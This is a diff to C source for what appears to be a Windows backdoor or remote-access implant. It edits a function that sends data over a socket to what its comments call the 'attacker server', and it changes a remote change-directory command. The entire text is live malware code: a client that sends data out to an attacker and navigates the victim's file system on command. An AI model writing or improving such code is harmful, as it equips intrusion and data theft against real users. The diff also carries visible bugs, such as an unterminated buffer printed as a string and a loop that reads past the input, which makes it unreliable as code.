@@ -50,27 +50,22 @@ void exitOnError() {
 // helper function to send info messages to the attacker server
 // "code" is the #DEFINE associated with the data being sent
 // assumes that the string passed has a null-terminator
+// TODO - won't always correctly send non-string data
 void sendData(char code, char* data) {
 	printf("Sending data to attacker server...\n");
 	// init local vars
-	int bytesToSend = strlen(data) + 1; // length of data + 1 byte for PRINT_INFO code
+	int bytesToSend = strlen(data) + 1; // length of data + null terminator + 1 byte for PRINT_INFO code
 	char* buff = (char*)malloc(bytesToSend);
 	int bytesSent = 0;
 	int retCode;
 	int repeats = 0;
 	// set up the buffer for the first try of sending data
-	ZeroMemory(buff, bytesToSend);
 	buff[0] = code;
 	memcpy((char*)(buff + 1), data, strlen(data));
 
-	printf("Sending the following data:\n");
-	printf("%s\n\n", buff);
-	printf("Strlen: %d\n", strlen(buff));
-	printf("Data len: %d\nData: %s\n", strlen(data), data);
-
 	// loop until all data is sent
 	do {
-		retCode = send(mainSock, buff, strlen(buff), 0);
+		retCode = send(mainSock, buff, bytesToSend - bytesSent, 0);
 		if (retCode == SOCKET_ERROR) {
 			printf("Could not send data: %d\n", WSAGetLastError());
 			exitOnError();
@@ -83,6 +78,8 @@ void sendData(char code, char* data) {
 		}
 	} while (bytesSent < bytesToSend + repeats);
 	printf("Data has been sent!\n");
+	printf("%s\n", buff);
+	free(buff);
 }
 
 /*
@@ -97,6 +94,11 @@ void changeDirectory(char* dirName) {
 	if (newLen + currLen + 1 > MAX_PATH) {
 		sendData(PRINT_INFO, "Path name is too long!\n\0");
 		return;
+	}
+	// change any '/' to be '\'
+	for (int i = 0; i < MAX_PATH; i++) {
+		if (dirName[i] == '/') {
+			dirName[i] = '\\'; }
 	}
 	// concatenate the strings and check if it's a valid directory
 	memcpy(buff, currDir, MAX_PATH);
